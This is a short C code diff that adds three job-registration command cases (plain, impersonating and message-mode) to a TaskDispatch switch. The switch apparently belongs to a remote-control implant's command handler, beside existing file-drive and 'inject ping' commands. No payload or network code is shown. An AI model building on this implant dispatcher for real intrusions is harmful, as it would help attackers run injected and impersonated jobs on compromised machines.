@@ -45,6 +45,15 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_FILE_DRIVES:
 			FilesystemDrives(buffer, size);
 			break;
+		case COMMAND_JOB_REGISTER:
+			JobRegister(buffer, size, FALSE, FALSE);
+			break;
+		case COMMAND_JOB_REGISTER_IMPERSONATE:
+			JobRegister(buffer, size, TRUE, FALSE);
+			break;
+		case COMMAND_JOB_REGISTER_MSGMODE:
+			JobRegister(buffer, size, FALSE, TRUE);
+			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
 			break;
